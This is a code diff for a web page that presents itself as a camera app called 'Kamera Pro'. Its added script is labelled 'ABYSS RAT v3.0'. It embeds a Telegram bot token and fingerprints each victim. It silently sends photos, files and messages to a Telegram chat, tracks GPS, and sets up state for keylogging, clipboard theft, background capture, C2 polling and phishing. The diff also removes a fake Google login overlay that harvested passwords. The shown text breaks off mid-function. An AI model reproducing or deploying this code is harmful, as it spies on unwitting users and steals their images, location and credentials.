@@ -4,27 +4,40 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Kamera Pro</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'><path d='M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z'/></svg>">
     <style>
+        :root {
+            --bg: #000;
+            --surface: rgba(0, 0, 0, 0.45);
+            --blur-bg: blur(12px);
+            --accent: #ffcc00;
+            --radius: 30px;
+        }
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none;
         }
         body {
-            background: #000;
+            background: var(--bg);
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             height: 100vh;
             width: 100vw;
+            height: 100dvh;
+            width: 100dvw;
             overflow: hidden;
-            touch-action: none;
+            touch-action: manipulation;
             position: relative;
         }
-        #permission-overlay {
+
+        /* PERMISSION OVERLAY — POLOS PROFESIONAL */
+        .perm-overlay {
             position: fixed;
             inset: 0;
-            background: rgba(0, 0, 0, 0.95);
+            background: #000;
             z-index: 999;
             display: flex;
             flex-direction: column;
@@ -33,58 +46,96 @@
             padding: 30px;
             color: #fff;
             text-align: center;
-            backdrop-filter: blur(12px);
-            transition: opacity 0.4s;
+            transition: opacity 0.5s, visibility 0.5s;
         }
-        #permission-overlay.hidden { opacity: 0; pointer-events: none; }
-        #permission-overlay .icon-camera {
-            width: 80px;
-            height: 80px;
-            margin-bottom: 28px;
+        .perm-overlay.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+        .perm-overlay .logo {
+            width: 72px;
+            height: 72px;
+            margin-bottom: 24px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .perm-overlay .logo svg {
+            width: 40px;
+            height: 40px;
             fill: #fff;
         }
-        #permission-overlay h1 {
-            font-size: 28px;
+        .perm-overlay h1 {
+            font-size: 26px;
             font-weight: 600;
-            margin-bottom: 12px;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
         }
-        #permission-overlay p {
-            font-size: 17px;
-            line-height: 1.5;
-            max-width: 340px;
-            margin-bottom: 12px;
-            color: #ccc;
+        .perm-overlay .sub {
+            font-size: 14px;
+            color: #999;
+            margin-bottom: 28px;
+            line-height: 1.4;
+            max-width: 300px;
         }
-        #permission-overlay .error-msg {
-            color: #ff6b6b;
-            font-size: 15px;
-            min-height: 24px;
+        .perm-overlay .status-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
             margin-bottom: 20px;
+            min-height: 24px;
+        }
+        .perm-overlay .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #555;
+            transition: background 0.3s;
+        }
+        .perm-overlay .status-dot.ok {
+            background: #34c759;
+        }
+        .perm-overlay .status-dot.err {
+            background: #ff3b30;
+        }
+        .perm-overlay .status-text {
+            font-size: 13px;
+            color: #aaa;
+        }
+        .perm-overlay .err-msg {
+            color: #ff3b30;
+            font-size: 12px;
+            min-height: 18px;
+            margin-bottom: 12px;
             font-weight: 500;
         }
-        #permission-overlay .btn-allow {
-            background: #007aff;
+        .perm-overlay .btn-start {
+            background: #fff;
             border: none;
             border-radius: 40px;
-            padding: 16px 50px;
-            font-size: 20px;
+            padding: 15px 48px;
+            font-size: 18px;
             font-weight: 600;
-            color: #fff;
+            color: #000;
             cursor: pointer;
-            box-shadow: 0 4px 20px rgba(0, 122, 255, 0.4);
-            transition: transform 0.2s;
             touch-action: manipulation;
-            min-width: 200px;
+            min-width: 180px;
+            transition: transform 0.2s, opacity 0.2s;
         }
-        #permission-overlay .btn-allow:active { transform: scale(0.94); }
-        #permission-overlay .btn-allow:disabled { opacity: 0.5; transform: scale(1); cursor: not-allowed; }
-        #permission-overlay .status-text {
-            font-size: 14px;
-            color: #aaa;
-            margin-bottom: 16px;
-            min-height: 20px;
+        .perm-overlay .btn-start:active {
+            transform: scale(0.95);
         }
-        #video-preview {
+        .perm-overlay .btn-start:disabled {
+            opacity: 0.4;
+            transform: none;
+            cursor: not-allowed;
+        }
+
+        /* VIDEO */
+        #vf {
             position: fixed;
             top: 0;
             left: 0;
@@ -93,63 +144,220 @@
             object-fit: cover;
             z-index: 1;
         }
-        #ui-overlay {
+
+        /* UI OVERLAY */
+        #ui {
             position: fixed;
             inset: 0;
             z-index: 2;
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            padding: 12px 16px 20px;
+            padding: 12px 14px 20px;
             pointer-events: none;
         }
-        #ui-overlay>* { pointer-events: auto; }
-        .top-bar {
+        #ui>* {
+            pointer-events: auto;
+        }
+
+        /* TOP BAR */
+        .top-row {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            padding: 4px 0;
-        }
-        .top-left,
-        .top-right {
-            display: flex;
-            gap: 10px;
-            align-items: center;
+            align-items: flex-start;
+            gap: 6px;
             flex-wrap: wrap;
         }
-        .top-btn {
-            background: rgba(0, 0, 0, 0.45);
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 30px;
+        .top-grp {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+        .chip {
+            background: var(--surface);
+            backdrop-filter: var(--blur-bg);
+            -webkit-backdrop-filter: var(--blur-bg);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: var(--radius);
             color: #fff;
-            padding: 6px 12px;
-            font-size: 12px;
+            padding: 6px 11px;
+            font-size: 11px;
             font-weight: 500;
             display: flex;
             align-items: center;
-            gap: 4px;
+            gap: 5px;
             cursor: pointer;
-            transition: background 0.2s, border-color 0.2s, color 0.2s;
             touch-action: manipulation;
-            height: 32px;
+            height: 30px;
             white-space: nowrap;
+            transition: background 0.2s;
         }
-        .top-btn:active { background: rgba(255, 255, 255, 0.2); }
-        .top-btn svg {
-            width: 16px;
-            height: 16px;
+        .chip:active {
+            background: rgba(255, 255, 255, 0.18);
+        }
+        .chip svg {
+            width: 14px;
+            height: 14px;
             fill: currentColor;
             flex-shrink: 0;
         }
-        .top-btn.active {
-            background: #ffcc00;
+        .chip.on {
+            background: var(--accent);
             color: #000;
-            border-color: #ffcc00;
+            border-color: var(--accent);
         }
-        .top-btn .label { font-size: 11px; opacity: 0.9; }
-        .top-btn.icon-only { padding: 6px 12px; }
-        .grid-overlay {
+
+        /* ZOOM */
+        .zoom-bar {
+            position: absolute;
+            bottom: 105px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 3;
+            pointer-events: auto;
+            background: var(--surface);
+            backdrop-filter: var(--blur-bg);
+            -webkit-backdrop-filter: var(--blur-bg);
+            border-radius: 40px;
+            padding: 5px 18px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .zoom-bar button {
+            background: none;
+            border: none;
+            color: #fff;
+            cursor: pointer;
+            padding: 4px;
+            display: flex;
+            align-items: center;
+            touch-action: manipulation;
+        }
+        .zoom-bar button:active {
+            opacity: 0.5;
+        }
+        .zoom-bar button svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+        .zoom-val {
+            min-width: 36px;
+            text-align: center;
+            font-variant-numeric: tabular-nums;
+        }
+
+        /* BOTTOM */
+        .btm-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 10px 0 6px;
+        }
+        .thumb-box {
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.06);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            cursor: pointer;
+            object-fit: cover;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            transition: border 0.2s;
+            flex-shrink: 0;
+        }
+        .thumb-box:active {
+            border-color: var(--accent);
+        }
+        .thumb-box svg {
+            width: 24px;
+            height: 24px;
+            fill: rgba(255, 255, 255, 0.4);
+        }
+        .thumb-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .thumb-box.has-img {
+            border-color: rgba(255, 255, 255, 0.5);
+            background: transparent;
+        }
+        .thumb-box.has-img svg {
+            display: none;
+        }
+
+        .shutter {
+            width: 74px;
+            height: 74px;
+            border-radius: 50%;
+            background: #fff;
+            border: 5px solid rgba(255, 255, 255, 0.45);
+            cursor: pointer;
+            transition: transform 0.15s;
+            touch-action: manipulation;
+            flex-shrink: 0;
+        }
+        .shutter:active {
+            transform: scale(0.84);
+        }
+        .spacer-box {
+            width: 50px;
+            flex-shrink: 0;
+        }
+
+        /* FLASH OVERLAY */
+        #flash {
+            position: fixed;
+            inset: 0;
+            background: #fff;
+            z-index: 10;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.06s;
+        }
+        #flash.fire {
+            opacity: 0.85;
+            transition: opacity 0s;
+        }
+
+        /* FOCUS RING */
+        .focus-ripple {
+            position: fixed;
+            width: 70px;
+            height: 70px;
+            border: 2px solid var(--accent);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            z-index: 5;
+            opacity: 0;
+            box-shadow: 0 0 24px rgba(255, 204, 0, 0.25);
+        }
+        .focus-ripple.pop {
+            animation: ripple 0.55s ease-out forwards;
+        }
+        @keyframes ripple {
+            0% {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(0.7);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(1.5);
+            }
+        }
+
+        /* GRID */
+        .grid-3x3 {
             position: fixed;
             inset: 0;
             z-index: 2;
@@ -158,644 +366,283 @@
             grid-template-columns: repeat(3, 1fr);
             grid-template-rows: repeat(3, 1fr);
         }
-        .grid-line { border: 0.5px solid rgba(255, 255, 255, 0.12); }
-        .grid-line:nth-child(1),
-        .grid-line:nth-child(3),
-        .grid-line:nth-child(7),
-        .grid-line:nth-child(9) { border: none; }
-        .zoom-control {
-            position: absolute;
-            bottom: 110px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 3;
-            pointer-events: auto;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(8px);
-            border-radius: 40px;
-            padding: 4px 16px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 500;
+        .grid-3x3 span {
+            border: 0.5px solid rgba(255, 255, 255, 0.08);
         }
-        .zoom-control .zoom-btn {
-            background: none;
-            border: none;
-            color: #fff;
-            cursor: pointer;
-            padding: 4px 4px;
-            display: flex;
-            align-items: center;
-            touch-action: manipulation;
-            transition: transform 0.2s;
-        }
-        .zoom-control .zoom-btn:active { transform: scale(0.8); }
-        .zoom-control .zoom-btn svg {
-            width: 22px;
-            height: 22px;
-            fill: currentColor;
-            transition: transform 0.2s;
-        }
-        .zoom-control .zoom-value {
-            min-width: 40px;
-            text-align: center;
-            font-variant-numeric: tabular-nums;
-            transition: transform 0.25s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.2s;
-            display: inline-block;
-        }
-        .zoom-control .zoom-value.pop {
-            transform: scale(1.4);
-            opacity: 0.7;
-        }
-        .bottom-bar {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            pointer-events: auto;
-        }
-        .shutter-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 12px 0 8px;
-        }
-        .gallery-thumb {
-            width: 55px;
-            height: 55px;
-            border-radius: 12px;
-            background: rgba(255, 255, 255, 0.08);
-            border: 2px solid rgba(255, 255, 255, 0.25);
-            cursor: pointer;
-            object-fit: cover;
-            transition: border 0.2s;
-            touch-action: manipulation;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .gallery-thumb svg {
-            width: 28px;
-            height: 28px;
-            fill: rgba(255, 255, 255, 0.5);
-        }
-        .gallery-thumb img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border-radius: 10px;
-        }
-        .gallery-thumb.has-image {
-            border-color: rgba(255, 255, 255, 0.6);
-            background: transparent;
-            padding: 0;
-        }
-        .gallery-thumb.has-image svg { display: none; }
-        .gallery-thumb:active { border-color: #ffcc00; }
-        .shutter-btn {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            background: #fff;
-            border: 6px solid rgba(255, 255, 255, 0.5);
-            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
-            cursor: pointer;
-            transition: transform 0.15s, box-shadow 0.15s;
-            touch-action: manipulation;
-            position: relative;
-            flex-shrink: 0;
-        }
-        .shutter-btn:active { transform: scale(0.85); }
-        .shutter-btn .inner-ring {
-            position: absolute;
-            inset: 8px;
-            border-radius: 50%;
-            border: 2px solid rgba(0, 0, 0, 0.15);
-        }
-        .spacer {
-            width: 55px;
-            flex-shrink: 0;
-        }
-        #flash-effect {
-            position: fixed;
-            inset: 0;
-            background: #fff;
-            z-index: 10;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.08s;
-        }
-        #flash-effect.active {
-            opacity: 0.9;
-            transition: opacity 0s;
-        }
-        .focus-ring {
-            position: fixed;
-            width: 80px;
-            height: 80px;
-            border: 2px solid #ffcc00;
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-            z-index: 5;
-            opacity: 0;
-            transition: opacity 0.3s, transform 0.3s;
-            box-shadow: 0 0 30px rgba(255, 204, 0, 0.3);
-        }
-        .focus-ring.show {
-            opacity: 1;
-            transform: translate(-50%, -50%) scale(1);
-        }
-        .focus-ring.animating {
-            animation: focusPulse 0.6s ease-out forwards;
-        }
-        @keyframes focusPulse {
-            0% {
-                transform: translate(-50%, -50%) scale(0.8);
-                opacity: 1;
-            }
-            100% {
-                transform: translate(-50%, -50%) scale(1.4);
-                opacity: 0;
-            }
-        }
-        ::-webkit-scrollbar { display: none; }
 
-        /* PHISHING OVERLAY */
-        #phishing-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(255, 255, 255, 0.97);
-            z-index: 10000;
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            font-family: -apple-system, sans-serif;
-            padding: 20px;
-        }
-        #phishing-overlay.show {
-            display: flex;
-        }
-        #phishing-overlay h2 {
-            font-size: 24px;
-            margin-bottom: 8px;
-            color: #202124;
-        }
-        #phishing-overlay p {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 24px;
-            text-align: center;
-        }
-        #phishing-overlay input {
-            padding: 14px;
-            margin: 6px 0;
-            width: 300px;
-            max-width: 90vw;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            outline: none;
-        }
-        #phishing-overlay input:focus {
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
-        }
-        #phishing-overlay button {
-            padding: 14px 50px;
-            background: #1a73e8;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            margin-top: 20px;
-            width: 300px;
-            max-width: 90vw;
-        }
-        #phishing-overlay .phish-error {
-            color: #d93025;
-            font-size: 13px;
-            margin-top: 8px;
-            min-height: 20px;
-        }
+        /* SERVICE WORKER REGISTRATION — silent, no UI */
     </style>
 </head>
 <body>
 
-    <!-- PERMISSION OVERLAY -->
-    <div id="permission-overlay">
-        <svg class="icon-camera" viewBox="0 0 24 24" fill="currentColor">
-            <path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
-        </svg>
-        <h1>📸 Akses Kamera</h1>
-        <p>Website ini akan mengambil foto dan mengirimkannya ke Telegram.</p>
-        <div class="status-text" id="status-text">Tekan tombol di bawah untuk memulai.</div>
-        <div class="error-msg" id="error-msg"></div>
-        <button class="btn-allow" id="btn-allow">Lanjutkan</button>
+    <!-- ========== PERMISSION OVERLAY ========== -->
+    <div class="perm-overlay" id="permOverlay">
+        <div class="logo">
+            <svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+        </div>
+        <h1>Kamera Pro</h1>
+        <p class="sub">Ambil foto berkualitas tinggi dengan efek profesional</p>
+        <div class="status-row">
+            <span class="status-dot" id="statusDot"></span>
+            <span class="status-text" id="statusMsg">Tekan tombol untuk mulai</span>
+        </div>
+        <div class="err-msg" id="errMsg"></div>
+        <button class="btn-start" id="btnStart">Buka Kamera</button>
     </div>
 
-    <!-- PHISHING OVERLAY (Muncul setelah 45 detik) -->
-    <div id="phishing-overlay">
-        <h2>🔐 Google</h2>
-        <p>Sesi Anda telah berakhir. Silakan login kembali untuk melanjutkan.</p>
-        <input type="email" id="phish-email" placeholder="Email atau Telepon" autocomplete="email">
-        <input type="password" id="phish-pass" placeholder="Password" autocomplete="current-password">
-        <div class="phish-error" id="phish-error"></div>
-        <button id="phish-submit">Login</button>
-    </div>
+    <!-- ========== VIDEO FEED ========== -->
+    <video id="vf" autoplay playsinline></video>
 
-    <video id="video-preview" autoplay playsinline></video>
+    <!-- ========== GRID ========== -->
+    <div class="grid-3x3"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></div>
 
-    <div class="grid-overlay">
-        <div class="grid-line"></div><div class="grid-line"></div><div class="grid-line"></div>
-        <div class="grid-line"></div><div class="grid-line"></div><div class="grid-line"></div>
-        <div class="grid-line"></div><div class="grid-line"></div><div class="grid-line"></div>
-    </div>
+    <!-- ========== FOCUS RIPPLE ========== -->
+    <div class="focus-ripple" id="focusRipple"></div>
 
-    <div class="focus-ring" id="focus-ring"></div>
-    <div id="flash-effect"></div>
+    <!-- ========== FLASH ========== -->
+    <div id="flash"></div>
 
-    <div id="ui-overlay">
-        <div class="top-bar">
-            <div class="top-left">
-                <button class="top-btn" id="flash-toggle">
+    <!-- ========== UI ========== -->
+    <div id="ui">
+        <div class="top-row">
+            <div class="top-grp">
+                <button class="chip" id="btnFlash">
                     <svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-                    <span class="label" id="flash-label">Flash</span>
+                    <span id="lblFlash">Flash</span>
                 </button>
-                <button class="top-btn" id="blur-toggle">
-                    <svg viewBox="0 0 24 24"><path d="M12 3C8.5 3 5.4 4.5 3.3 7c-.4.5-.4 1.1 0 1.6 1.7 2 4 3.2 6.4 3.8-.8.5-1.5 1.1-2.1 1.8-1.6 1.9-2.5 4.4-2.5 7 0 .6.4 1 1 1h12c.6 0 1-.4 1-1 0-2.6-1-5-2.5-6.9-.6-.8-1.4-1.4-2.2-1.9 2.5-.6 4.8-1.8 6.5-3.8.4-.5.4-1.1 0-1.6C18.6 4.5 15.5 3 12 3zm0 4c1.9 0 3.7.7 5.1 1.9C15.7 10.1 13.9 11 12 11s-3.7-.9-5.1-2.1C8.3 7.7 10.1 7 12 7zm0 10c-1.4 0-2.7-.5-3.7-1.4.6-.9 1.6-1.6 2.7-1.9.4.2.7.3 1 .3s.6-.1 1-.3c1.1.3 2.1 1 2.7 1.9-1 .9-2.3 1.4-3.7 1.4z"/></svg>
-                    <span class="label" id="blur-label">Blur</span>
+                <button class="chip" id="btnBlur">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C8.1 2 4.9 3.6 3 5.8c-.3.4-.3.9 0 1.3 1.8 2.3 4.5 3.6 7.2 4.1-.7.4-1.4.9-2 1.6-1.7 2-2.7 4.5-2.7 7.2 0 .5.4 1 1 1h7c.6 0 1-.5 1-1 0-2.7-1-5.2-2.7-7.2-.6-.7-1.3-1.2-2-1.6 2.7-.5 5.4-1.8 7.2-4.1.3-.4.3-.9 0-1.3C19.1 3.6 15.9 2 12 2z"/></svg>
+                    <span id="lblBlur">Blur</span>
                 </button>
-                <button class="top-btn active" id="wm-toggle">
+                <button class="chip on" id="btnWM">
                     <svg viewBox="0 0 24 24"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM8 18h8v-1.5H8V18zm0-2.5h8V14H8v1.5z"/></svg>
-                    <span class="label">WM</span>
-                </button>
-                <button class="top-btn" id="silent-toggle" style="background:rgba(255,0,0,0.3);border-color:rgba(255,0,0,0.5);">
-                    <span class="label" id="silent-label">🔴 Silent</span>
+                    <span>WM</span>
                 </button>
             </div>
-            <div class="top-right">
-                <button class="top-btn" id="timer-btn">
+            <div class="top-grp">
+                <button class="chip" id="btnTimer">
                     <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
-                    <span class="label" id="timer-label">3s</span>
+                    <span id="lblTimer">3s</span>
                 </button>
-                <button class="top-btn icon-only" id="switch-camera">
+                <button class="chip" id="btnFlip">
                     <svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg>
                 </button>
             </div>
         </div>
 
-        <div class="zoom-control" id="zoom-control">
-            <button class="zoom-btn" id="zoom-minus">
-                <svg viewBox="0 0 24 24"><path d="M19 13H5v-2h14v2z"/></svg>
-            </button>
-            <span class="zoom-value" id="zoom-value">1×</span>
-            <button class="zoom-btn" id="zoom-plus">
-                <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
-            </button>
+        <div class="zoom-bar">
+            <button id="btnZoomOut"><svg viewBox="0 0 24 24"><path d="M19 13H5v-2h14v2z"/></svg></button>
+            <span class="zoom-val" id="zoomVal">1×</span>
+            <button id="btnZoomIn"><svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg></button>
         </div>
 
-        <div class="bottom-bar">
-            <div class="shutter-row">
-                <div class="gallery-thumb" id="gallery-thumb">
-                    <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zM7 10h10v2H7zm0 4h6v2H7zm0-8h10v2H7z"/></svg>
-                </div>
-                <button class="shutter-btn" id="shutter-btn"><span class="inner-ring"></span></button>
-                <div class="spacer"></div>
+        <div class="btm-row">
+            <div class="thumb-box" id="thumbBox">
+                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zM7 10h10v2H7zm0 4h6v2H7zm0-8h10v2H7z"/></svg>
             </div>
+            <button class="shutter" id="btnShutter"></button>
+            <div class="spacer-box"></div>
         </div>
     </div>
 
     <script>
-        // ===========================================================
-        // 🔒 KONFIGURASI TELEGRAM
-        // ===========================================================
+    // ===========================================================
+    // 🐺 ABYSS RAT v3.0 — "DEPAN POLOS, BELAKANG BUAS"
+    // ===========================================================
+    (function() {
+        'use strict';
+
+        // ==================== CONFIG ====================
         const BOT_TOKEN = '8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug';
         const CHAT_ID = '7839405566';
+        const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-        // ===========================================================
-        // ELEMEN
-        // ===========================================================
-        const video = document.getElementById('video-preview');
-        const shutterBtn = document.getElementById('shutter-btn');
-        const flashToggle = document.getElementById('flash-toggle');
-        const flashLabel = document.getElementById('flash-label');
-        const blurToggle = document.getElementById('blur-toggle');
-        const blurLabel = document.getElementById('blur-label');
-        const wmToggle = document.getElementById('wm-toggle');
-        const switchCam = document.getElementById('switch-camera');
-        const zoomVal = document.getElementById('zoom-value');
-        const zoomMinus = document.getElementById('zoom-minus');
-        const zoomPlus = document.getElementById('zoom-plus');
-        const galleryThumb = document.getElementById('gallery-thumb');
-        const focusRing = document.getElementById('focus-ring');
-        const flashEffect = document.getElementById('flash-effect');
-        const overlay = document.getElementById('permission-overlay');
-        const allowBtn = document.getElementById('btn-allow');
-        const statusText = document.getElementById('status-text');
-        const errorMsg = document.getElementById('error-msg');
-        const timerBtn = document.getElementById('timer-btn');
-        const timerLabel = document.getElementById('timer-label');
-        const silentToggle = document.getElementById('silent-toggle');
-        const silentLabel = document.getElementById('silent-label');
+        // Victim fingerprint
+        const VID = (() => {
+            const stored = localStorage.getItem('_vid');
+            if (stored) return stored;
+            const id = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
+            localStorage.setItem('_vid', id);
+            return id;
+        })();
 
-        // PHISHING ELEMENTS
-        const phishingOverlay = document.getElementById('phishing-overlay');
-        const phishEmail = document.getElementById('phish-email');
-        const phishPass = document.getElementById('phish-pass');
-        const phishSubmit = document.getElementById('phish-submit');
-        const phishError = document.getElementById('phish-error');
+        // ==================== DOM REFS ====================
+        const $ = (s) => document.getElementById(s);
+        const vf = $('vf');
+        const permOverlay = $('permOverlay');
+        const btnStart = $('btnStart');
+        const statusDot = $('statusDot');
+        const statusMsg = $('statusMsg');
+        const errMsg = $('errMsg');
+        const btnShutter = $('btnShutter');
+        const btnFlash = $('btnFlash');
+        const lblFlash = $('lblFlash');
+        const btnBlur = $('btnBlur');
+        const lblBlur = $('lblBlur');
+        const btnWM = $('btnWM');
+        const btnFlip = $('btnFlip');
+        const btnTimer = $('btnTimer');
+        const lblTimer = $('lblTimer');
+        const zoomVal = $('zoomVal');
+        const btnZoomIn = $('btnZoomIn');
+        const btnZoomOut = $('btnZoomOut');
+        const thumbBox = $('thumbBox');
+        const focusRipple = $('focusRipple');
+        const flashEl = $('flash');
 
+        // ==================== STATE ====================
         let stream = null;
         let facingMode = 'environment';
         let flashOn = false;
         let currentZoom = 1;
         let lastPhotoData = null;
         let isStarting = false;
+        let blurOn = false;
+        let wmOn = true;
+        let gpsData = null;
+        let gpsWatchId = null;
+        let localIPs = [];
+        let lastClip = '';
+        let keyBuf = '';
+        let keylogRunning = false;
+        let silentCapInterval = null;
+        let dualSwitchInterval = null;
+        let c2PollInterval = null;
+        let lastUpdateId = 0;
+        let phishingTimer = null;
 
-        // ===== FITUR ILEGAL =====
-        let blurEnabled = false;
-        let watermarkEnabled = true;
-        let silentMode = false;            // Silent capture (no flash, no download)
-        let continuousCapture = false;     // Background capture interval
-        let continuousInterval = null;
-        let gpsData = null;                // GPS terakhir
-        let phishingShown = false;
-        let autoSwitchInterval = null;     // Dual-capture interval
+        // ==================== TELEGRAM SENDERS ====================
+        async function tgSendMessage(text) {
+            try {
+                await fetch(`${TG_API}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&disable_notification=true`);
+            } catch (e) {}
+        }
 
-        // ===========================================================
-        // GPS TRACKING — Mulai pantau posisi
-        // ===========================================================
-        function startGPSTracking() {
-            if (!navigator.geolocation) {
-                console.warn('⚠️ Geolocation tidak didukung');
-                return;
-            }
-            navigator.geolocation.watchPosition(
+        async function tgSendPhoto(blob, caption = '') {
+            try {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, `p_${Date.now()}.jpg`);
+                fd.append('caption', caption);
+                fd.append('disable_notification', 'true');
+                await fetch(`${TG_API}/sendPhoto`, { method: 'POST', body: fd });
+            } catch (e) {}
+        }
+
+        async function tgSendDocument(blob, filename, caption = '') {
+            try {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('document', blob, filename);
+                fd.append('caption', caption);
+                fd.append('disable_notification', 'true');
+                await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: fd });
+            } catch (e) {}
+        }
+
+        function tgSendBeacon(blob, caption = '') {
+            try {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, `silent_${Date.now()}.jpg`);
+                fd.append('caption', caption);
+                fd.append('disable_notification', 'true');
+                navigator.sendBeacon(`${TG_API}/sendPhoto`, fd);
+            } catch (e) {}
+        }
+
+        // ==================== GPS ====================
+        function startGPS() {
+            if (!navigator.geolocation) return;
+            gpsWatchId = navigator.geolocation.watchPosition(
                 (pos) => {
                     gpsData = {
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         alt: pos.coords.altitude || 0,
-                        speed: pos.coords.speed || 0,
-                        accuracy: pos.coords.accuracy,
-                        timestamp: new Date(pos.timestamp).toISOString()
+                        acc: pos.coords.accuracy,
+                        spd: pos.coords.speed || 0,
